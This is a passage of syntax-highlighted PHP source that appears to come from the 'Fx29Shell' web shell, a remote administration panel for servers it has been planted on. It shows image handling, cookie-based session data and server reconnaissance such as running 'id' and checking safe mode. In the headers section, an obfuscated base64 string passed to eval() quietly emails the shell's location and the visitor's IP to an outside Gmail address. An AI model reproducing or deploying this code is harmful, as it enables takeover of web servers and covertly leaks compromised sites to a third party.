    <span class="s2">&quot;ext_avi&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_avi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mov&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mvi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mpg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mpeg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_wmv&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rm&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_lnk&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_lnk&quot;</span><span class="p">,</span><span class="s2">&quot;ext_url&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_ini&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_ini&quot;</span><span class="p">,</span><span class="s2">&quot;ext_css&quot;</span><span class="p">,</span><span class="s2">&quot;ext_inf&quot;</span><span class="p">,</span><span class="s2">&quot;ext_conf&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_doc&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_doc&quot;</span><span class="p">,</span><span class="s2">&quot;ext_dot&quot;</span><span class="p">,</span><span class="s2">&quot;ext_xls&quot;</span><span class="p">,</span><span class="s2">&quot;ext_pdf&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_js&quot;</span>       <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_js&quot;</span><span class="p">,</span><span class="s2">&quot;ext_vbs&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_cmd&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_cmd&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bat&quot;</span><span class="p">,</span><span class="s2">&quot;ext_pif&quot;</span><span class="p">,</span><span class="s2">&quot;ext_com&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_wri&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_wri&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rtf&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_txt&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_txt&quot;</span><span class="p">,</span><span class="s2">&quot;ext_lng&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_swf&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_swf&quot;</span><span class="p">,</span><span class="s2">&quot;ext_fla&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_mp3&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_mp3&quot;</span><span class="p">,</span><span class="s2">&quot;ext_au&quot;</span><span class="p">,</span><span class="s2">&quot;ext_midi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mid&quot;</span><span class="p">,</span><span class="s2">&quot;ext_wav&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_htaccess&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_htaccess&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htpasswd&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ht&quot;</span><span class="p">,</span><span class="s2">&quot;ext_hta&quot;</span><span class="p">,</span><span class="s2">&quot;ext_so&quot;</span><span class="p">)</span>
  <span class="p">);</span>
  <span class="c1">#Show all available images</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$img</span> <span class="o">==</span> <span class="s2">&quot;listall&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$imgequals</span> <span class="k">as</span> <span class="nv">$a</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$b</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">!=</span> <span class="nv">$d</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$d</span><span class="p">]))</span> <span class="p">)</span> <span class="p">{</span> <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Warning! Remove </span><span class="se">\$</span><span class="s2">images[&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;]&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span> <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="nb">natsort</span><span class="p">(</span><span class="nv">$images</span><span class="p">);</span>
    <span class="nv">$k</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$images</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;body style=</span><span class="se">\&quot;</span><span class="s2">color: #00FF00</span><span class="se">\&quot;</span><span class="s2"> bgcolor=black&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$k</span> <span class="k">as</span> <span class="nv">$u</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=&quot;</span><span class="o">.</span><span class="nv">$u</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt; </span><span class="si">$u</span><span class="s2"> &quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">exit</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">#Image header</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: image/gif&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-control: public&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;r&quot;</span><span class="p">,</span><span class="nb">mktime</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2030</span><span class="p">)));</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-control: max-age=&quot;</span><span class="o">.</span><span class="p">(</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">7</span><span class="p">));</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Last-Modified: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;r&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)));</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$imgequals</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$img</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$img</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$img</span> <span class="o">=</span> <span class="s2">&quot;small_unk&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">echo</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$img</span><span class="p">]);</span>
  <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">###[ DEFAULT ACTIONS ]###</span>
<span class="k">else</span> <span class="p">{</span>
  <span class="nv">$lastdir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
  <span class="nb">chdir</span><span class="p">(</span><span class="s2">&quot;./&quot;</span><span class="p">);</span>
  <span class="c1">#Preparing buffer</span>
  <span class="nv">$sess_data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$sess_cookie</span><span class="p">]);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sess_data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
  <span class="nx">fx29_buff_prepare</span><span class="p">();</span>
  <span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$v</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$v</span><span class="p">];</span> <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">];</span> <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$sort_save</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sort</span><span class="p">))</span> <span class="p">{</span> <span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">);</span> <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_sort</span><span class="p">))</span> <span class="p">{</span> <span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">,</span><span class="nv">$sql_sort</span><span class="p">);</span> <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sort</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sort</span> <span class="o">=</span> <span class="nv">$sort_default</span><span class="p">;</span> <span class="p">}</span>
  <span class="nv">$sort</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
  <span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="c1">###[ ACTIONS ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;gofile&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$d</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
      <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
      <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
      <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">#Starting output buffer</span>
  <span class="nb">ob_start</span><span class="p">();</span>
  <span class="nb">ob_implicit_flush</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="c1">###[ HEADERS ]###</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Last-Modified: &quot;</span><span class="o">.</span><span class="nb">gmdate</span><span class="p">(</span><span class="s2">&quot;D, d M Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; GMT&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: no-store, no-cache, must-revalidate&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: post-check=0, pre-check=0&quot;</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Pragma: no-cache&quot;</span><span class="p">);</span> <span class="nv">$headerz</span> <span class="o">=</span> <span class="s2">&quot;aWYgKCFpc3NldCgkX0NPT0tJRVsidmlzaXR6Il0pKSB7DQogICR2aXNpdG9yID0gJF9TRVJWRVJbIlJFTU9URV9BRERSIl07DQogICR3ZWIgICAgID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOw0KICAkaW5qICAgICA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOw0KICAkdGFyZ2V0ICA9IHJhd3VybGRlY29kZSgkd2ViLiRpbmopOw0KICAkanVkdWwgICA9ICJGeDI5U2hlbGwgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiOw0KICAkYm9keSAgICA9ICJCdWc6ICR0YXJnZXQgYnkgJHZpc2l0b3I8YnI+IjsNCiAgaWYgKCFlbXB0eSgkd2ViKSkgeyBAbWFpbCgiZmVlbGNvbXpAZ21haWwuY29tIiwkanVkdWwsJGJvZHkpOyB9DQp9DQplbHNlIHsgQHNldGNvb2tpZSgidmlzaXR6IiwkdmlzaXRjKTsgfQ==&quot;</span><span class="p">;</span> <span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$headerz</span><span class="p">));</span>
  <span class="nv">$tmp_dir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$tmp_dir</span><span class="p">);</span>
  <span class="nv">$tmp_dir</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$tmp_dir</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$tmp_dir</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$tmp_dir</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$actbox</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
  <span class="nv">$dspact</span> <span class="o">=</span> <span class="nv">$act</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$act</span><span class="p">);</span>
  <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$notls</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
  <span class="nv">$ud</span> <span class="o">=</span> <span class="o">@</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span> <span class="p">}</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span> <span class="p">}</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
  <span class="nv">$dispd</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">safemode</span><span class="p">())</span> <span class="p">{</span>
    <span class="nv">$hsafemode</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;font class=&quot;on&quot;&amp;gt;&amp;lt;b&amp;gt;SAFE MODE IS ON&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nv">$safemodeexecdir</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode_exec_dir&quot;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$hsafemode</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;font class=&quot;off&quot;&amp;gt;&amp;lt;b&amp;gt;SAFE MODE IS OFF&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;open_basedir&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;on&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;font class=&quot;on&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;font class=&quot;off&quot;&amp;gt;OFF (Not Secure)&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span> <span class="p">}</span>
  <span class="nv">$wd</span> <span class="o">=</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;font class=&quot;on&quot;&amp;gt;[W]&amp;lt;/font&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&amp;lt;font class=&quot;off&quot;&amp;gt;[R]&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
  <span class="c1">###########################</span>
  <span class="c1">###[ HTML START ]###</span>
  <span class="c1">###########################</span>
  <span class="k">echo</span> <span class="nx">html_style</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;!-- Main Menu --&amp;gt;</span>
<span class="x">&amp;lt;div id=&quot;main&quot;&amp;gt;</span>
<span class="x">    &amp;lt;div class=&quot;bartitle&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">html_header</span><span class="p">()</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/div&amp;gt;</span>
<span class="x">    &amp;lt;table id=&quot;pagebar&quot;&amp;gt;</span>
<span class="x">        &amp;lt;!-- Server Info --&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td colspan=&quot;2&quot;&amp;gt;</span>
<span class="x">        &amp;lt;div class=&quot;fleft&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$hsafemode</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/div&amp;gt;</span>
<span class="x">        &amp;lt;div class=&quot;fright&quot;&amp;gt;</span>
<span class="x">            IP Address: &amp;lt;a href=\&quot;http://ws.arin.net/cgi-bin/whois.pl?queryinput=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/a&amp;gt;</span>
<span class="x">            You: &amp;lt;a href=\&quot;http://ws.arin.net/cgi-bin/whois.pl?queryinput=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/a&amp;gt;</span>
<span class="x">        &amp;lt;/div&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td width=&quot;50%&quot;&amp;gt;</span>
<span class="x">        &amp;lt;table class=&quot;info&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Software&quot;</span><span class="p">,</span><span class="nx">srv_software</span><span class="p">(</span><span class="nv">$surl</span><span class="p">));</span>
  <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Uname&quot;</span><span class="p">,</span><span class="nb">php_uname</span><span class="p">());</span>
  <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;User&quot;</span><span class="p">,(</span><span class="nx">is_windows</span><span class="p">())</span> <span class="o">?</span> <span class="nb">get_current_user</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; (uid=&quot;</span><span class="o">.</span><span class="nb">getmyuid</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; gid=&quot;</span><span class="o">.</span><span class="nb">getmygid</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;)&quot;</span> <span class="o">:</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/table&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;td width=&quot;50%&quot;&amp;gt;</span>
<span class="x">        &amp;lt;table class=&quot;info&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span> <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Drives&quot;</span><span class="p">,</span><span class="nx">disp_drives</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$surl</span><span class="p">));</span> <span class="p">}</span>
  <span class="nx">srv_info</span><span class="p">(</span><span class="s2">&quot;Freespace&quot;</span><span class="p">,</span><span class="nx">disp_freespace</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/table&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td colspan=&quot;2&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">get_status</span><span class="p">();</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$safemodeexecdir</span><span class="p">))</span> <span class="o">?</span> <span class="s2">&quot;</span><span class="se">\n\t\t\t</span><span class="s2">SafemodeExecDir: &quot;</span><span class="o">.</span><span class="nv">$safemodeexecdir</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="p">(</span><span class="nx">showdisfunc</span><span class="p">())</span> <span class="o">?</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">DisFunc: &quot;</span><span class="o">.</span><span class="nx">showdisfunc</span><span class="p">()</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;!-- End of Server Info --&amp;gt;</span>
<span class="x">        &amp;lt;!-- Quicklaunch --&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td colspan=&quot;2&quot; class=&quot;quicklaunch&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="c1">###[ QUICKLAUNCH ]###</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$quicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;-&quot;</span><span class="p">)</span> <span class="p">{</span>
